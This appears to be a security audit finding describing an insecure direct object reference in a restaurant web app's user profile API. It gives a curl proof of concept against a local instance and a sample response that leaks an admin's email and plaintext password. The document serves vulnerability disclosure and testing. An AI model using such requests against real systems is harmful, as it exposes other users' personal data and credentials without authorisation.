# H4 — IDOR: Cross-User Profile Access (V06)

**Severity:** High  
**CWE:** CWE-639 | **OWASP:** A01:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-006-v06-idor-profile.md`

## Summary

`GET /api/user/profile?id=` uses the user-supplied `id` query, ignoring the session. Returns any user's profile including plaintext password (chains with V08 / F-A1).

## PoC

```bash
curl "http://localhost:4443/api/user/profile?id=1" -H "Cookie: restaurant_session=<any_session>"
# Response: { "id":1, "username":"admin", "email":"admin@thelocalplate.com",
#             "password":"Admin@2024!", "role":"admin", ... }
```
